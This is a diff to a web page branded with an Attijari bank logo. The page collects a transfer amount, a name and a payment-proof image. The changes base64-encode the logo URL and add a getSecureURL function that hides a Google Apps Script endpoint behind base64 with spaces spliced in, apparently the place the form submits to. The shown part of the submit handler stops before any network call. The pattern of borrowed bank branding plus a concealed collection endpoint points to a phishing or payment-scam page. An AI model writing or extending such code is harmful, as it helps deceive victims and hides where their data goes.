@@ -75,7 +75,7 @@
 
   <form class="card" id="transferForm">  
     <div class="card-top">  
-      <img src="https://i.postimg.cc/1RjgFj2r/attijari-bank.png" alt="attijari-bank.png">  
+      <img id="bankLogo" alt="bank-logo">  
     </div>  
 
     <div class="card-bottom">  
@@ -142,6 +142,11 @@
   <input type="text" id="hiddenCopyInput" style="position:absolute;top:-9999px;left:-9999px;" readonly>  
 
   <script>  
+    // ----- IMAGE (bank logo) -----  
+    const encodedImg = "aHR0cHM6Ly9pLnBvc3RpbWcuY2MvMVJqZ0ZqMnIvYXR0aWphcmktYmFuay5wbmc=";  
+    document.getElementById("bankLogo").src = atob(encodedImg);  
+
+    // ----- COPY FUNCTION -----  
     function copyText(el,val){  
       if(navigator.clipboard){  
         navigator.clipboard.writeText(val).then(()=>showCopied(el)).catch(()=>fallbackCopy(el,val))  
@@ -158,6 +163,7 @@
       }  
     }  
 
+    // ----- PREVIEW IMAGE -----  
     document.getElementById('proof').addEventListener('change',e=>{  
       const f=e.target.files[0],p=document.getElementById('preview');  
       if(f&&f.type.startsWith('image/')){  
@@ -167,6 +173,7 @@
       }else{p.src='';p.style.display='none'}  
     });  
 
+    // ----- INPUT VALIDATION -----  
     document.getElementById("amount").addEventListener("input",function(){  
       this.value=this.value.replace(/[^0-9.]/g,"");  
     });  
@@ -174,6 +181,7 @@
       this.value=this.value.replace(/[^A-Za-z ]/g,"");  
     });  
 
+    // ----- SECURE URL -----  
     function getSecureURL(){  
       const encoded = "aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvc y9BS2Z5Y2J5X3lQZ1hDQ0ZwdkdSU TREb2ExRk1mSFM0alhkNXk4cC0tZlBRQU ZuQURjRkk2S WN2ZlBwNVd0Wmp0MkdqcVh6b25lUS9leGVj";  
       return atob(encoded.replace(/\s/g,""));  
@@ -182,6 +190,7 @@
     const loadingScreen=document.getElementById("loadingScreen");  
     const submitBtn=document.getElementById("submitBtn");  
 
+    // ----- SUBMIT FORM -----  
     document.getElementById("transferForm").addEventListener("submit",async e=>{  
       e.preventDefault();  
       const a=document.getElementById("amount").value.trim();  
